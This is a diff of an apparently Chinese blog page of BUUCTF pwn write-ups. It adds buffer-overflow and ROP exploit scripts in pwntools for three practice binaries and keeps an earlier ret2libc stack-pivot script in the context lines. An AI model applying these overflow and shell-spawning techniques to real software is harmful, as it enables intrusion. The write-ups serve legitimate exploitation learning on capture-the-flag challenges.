@@ -63,7 +63,7 @@
                                                总文章数 40
                                 </nav>
                                 <nav>
-	总字数 <span class="post-count">67.9k</span>
+	总字数 <span class="post-count">68.3k</span>
                                 </nav>
 		<nav class="header-smart-menu">
     		
@@ -163,7 +163,7 @@
     
       <header class="article-header">
         <div align="center" class="post-count">
-    字数：1.6k字 | 预计阅读时长：7分钟
+    字数：2k字 | 预计阅读时长：9分钟
 </div>
         
   
@@ -306,6 +306,68 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>,os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;i386&quot;</span>)</span><br><span class="line">io=process(<span class="string">&quot;./spwn&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;spwn&quot;</span>)</span><br><span class="line">write_plt=elf.plt[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">main=<span class="number">0x08048513</span></span><br><span class="line">s_addr=<span class="number">0x0804A300</span></span><br><span class="line">leave_ret=<span class="number">0x08048511</span></span><br><span class="line">io.recv()</span><br><span class="line">payload1=p32(write_plt)+p32(main)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line">io.send(payload1)</span><br><span class="line">io.recv()</span><br><span class="line">payload2=<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x18</span>+p32(s_addr-<span class="number">4</span>)+p32(leave_ret)   //由于pop ebp，所以s_addr-<span class="number">4</span>,经过一次pop之后就到了bss段的起址</span><br><span class="line">io.send(payload2)</span><br><span class="line">write_addr=u32(io.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write_addr))</span><br><span class="line">libc=LibcSearcher(<span class="string">&quot;write&quot;</span>,write_addr)</span><br><span class="line">libc_base=write_addr-libc.dump(<span class="string">&quot;write&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system=libc_base+libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">bin_sh=libc_base+libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;name?&quot;</span>)</span><br><span class="line">payload3=p32(system)+p32(main)+p32(bin_sh)</span><br><span class="line">io.sendline(payload3)</span><br><span class="line">io.recvuntil(<span class="string">&quot;say?&quot;</span>)</span><br><span class="line">io.sendline(payload2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
 <p>第一段将rop写入bss栈迁移到bss段泄露libc，同理第二段执行shell。</p>
+<h2 id="jarvisoj-test-your-memory"><a href="#jarvisoj-test-your-memory" class="headerlink" title="jarvisoj_test_your_memory"></a>jarvisoj_test_your_memory</h2><p><img src="/2024/02/18/buuctf-pwn/image-20240220211115416.png"></p>
+<p>32位程序</p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240220211050708.png"></p>
+<p>漏洞函数在<code>__isoc99_scanf</code>，没有字节限制，可以溢出</p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240220211423590.png"></p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240220212258488.png"></p>
+<p>存在<code>system</code>函数和cat flag，直接利用</p>
+<p>查看偏移<code>0x13+4</code></p>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">win_func = <span class="number">0x080485BD</span></span><br><span class="line">ret_func = <span class="number">0x080485CF</span></span><br><span class="line">cat_flag = <span class="number">0x080487E0</span></span><br><span class="line">p = process(<span class="string">&#x27;./memory&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">23</span> + p32(ret_func) + p32(win_func) + p32(<span class="number">1</span>) + p32(cat_flag)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>由于偏移不是4的倍数，所以加一个ret使栈对齐，否则不会成功</p>
+<p>成功</p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240220212624517.png"></p>
+<h2 id="picoctf-2018-buffer-overflow-2"><a href="#picoctf-2018-buffer-overflow-2" class="headerlink" title="picoctf_2018_buffer overflow_2"></a>picoctf_2018_buffer overflow_2</h2><p>查看保护</p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240221201138575.png"></p>
+<p>32位程序</p>
+<p>IDA查看，查看偏移</p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240221201244166.png"></p>
+<p><code>0X6C+4=112</code></p>
+<p>存在win函数<code>0x080485CB</code></p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240221202920224.png"></p>
+<p>相比于<code>picoctf_2018_buffer overflow_1</code>需要两个参数a1和a2进行验证</p>
+<p>32位程序的参数在返回地址的栈上</p>
+<p>构建payload</p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">win_addr = <span class="number">0x080485CB</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">112</span> + p32(win_addr) + p32(<span class="number">0</span>) + p32(<span class="number">0xDEADBEEF</span>) + p32(<span class="number">0xDEADC0DE</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./PicoCTF_2018_buffer_overflow_2&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/02/18/buuctf-pwn/image-20240221203114166.png"></p>
+<p>成功打印字符串</p>
+<h2 id="cmcc-simplerop"><a href="#cmcc-simplerop" class="headerlink" title="cmcc_simplerop"></a>cmcc_simplerop</h2><p>查看保护</p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240221203530856.png"></p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240221203649640.png"></p>
+<p>文件很大，查看发现是静态链接</p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240221203732979.png"></p>
+<p>看一下有没有<code>int 80</code></p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240221204231425.png"></p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240221205030401.png"></p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240221204950976.png"></p>
+<p>查看偏移<code>28+4=32</code></p>
+<p><code>ROPgadget --binary simplerop --only &quot;int&quot;</code></p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240221210751048.png"></p>
+<p><strong>可以考虑利用rop链调用execve函数，用系统调用的函数参数是存在寄存器中的，但是本程序找不到&#x2F;bin&#x2F;sh的字符串，可以利用read函数读入&#x2F;bin&#x2F;sh字符串</strong></p>
+<p><strong>gadget</strong></p>
+<p><img src="/2024/02/18/buuctf-pwn/Users\26645\AppData\Roaming\Typora\typora-user-images\image-20240221211109237.png" alt="image-20240221211109237"></p>
+<p><code>ROPgadget --binary simplerop --only &quot;pop|ret&quot; | grep &quot;edx&quot;</code></p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240221211302948.png"></p>
+<p><code>ROPgadget --binary simplerop --only &quot;pop|ret&quot; | grep &quot;eax&quot;</code></p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240221211348886.png"></p>
+<p><code>read_plt</code></p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240221211716815.png"></p>
+<p><code>read</code>函数的参数:</p>
+<ol>
+<li>fd：文件描述符</li>
+<li>buf：指定读入数据的数据缓冲区</li>
+<li>count：指定读入的字节数</li>
+</ol>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">read_plt = <span class="number">0x0806CD50</span></span><br><span class="line">pop_edx_ecx_ebx = <span class="number">0x0806e850</span></span><br><span class="line">pop_eax = <span class="number">0x080bae06</span></span><br><span class="line">int_80 = <span class="number">0x080493e1</span></span><br><span class="line">bss_addr = <span class="number">0x080EC2C0</span></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">io = process(<span class="string">&#x27;./simplerop&#x27;</span>)</span><br><span class="line">io.recv()</span><br><span class="line">p = <span class="string">b&#x27;a&#x27;</span>*<span class="number">32</span> + p32(read_plt) + p32(pop_edx_ecx_ebx) + p32(<span class="number">0</span>) + p32(bss_addr) + p32(<span class="number">8</span>)  <span class="comment">#给read函数赋参数，读入/bin/sh，同时pop_edx_ecx_ebx将read参数弹出，为了后续执行</span></span><br><span class="line">p += p32(pop_eax) + p32(<span class="number">11</span>) + p32(pop_edx_ecx_ebx) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(bss_addr) + p32(int_80)  <span class="comment">#execve的系统调用号是11，存在eax中，再将execve的参数依次传到对应寄存器，最后80中断执行</span></span><br><span class="line">io.send(p)</span><br><span class="line">io.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>成功</p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240221214904809.png"></p>
 
       
 
